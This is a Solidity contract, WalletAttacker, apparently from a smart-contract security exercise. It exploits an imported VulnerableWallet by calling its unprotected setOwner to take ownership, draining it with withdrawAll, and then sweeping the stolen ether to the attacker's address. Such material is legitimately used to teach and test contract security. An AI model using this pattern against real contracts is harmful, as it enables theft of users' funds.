// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {VulnerableWallet} from "./VulnerableWallet.sol";

contract WalletAttacker {
    VulnerableWallet public immutable wallet;
    address public immutable owner;

    constructor(address wallet_) {
        wallet = VulnerableWallet(wallet_);
        owner = msg.sender;
    }

    function attack() external {
        wallet.setOwner(address(this));
        wallet.withdrawAll();
    }

    function sweep() external {
        require(msg.sender == owner, "only owner");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }

    receive() external payable {}
}
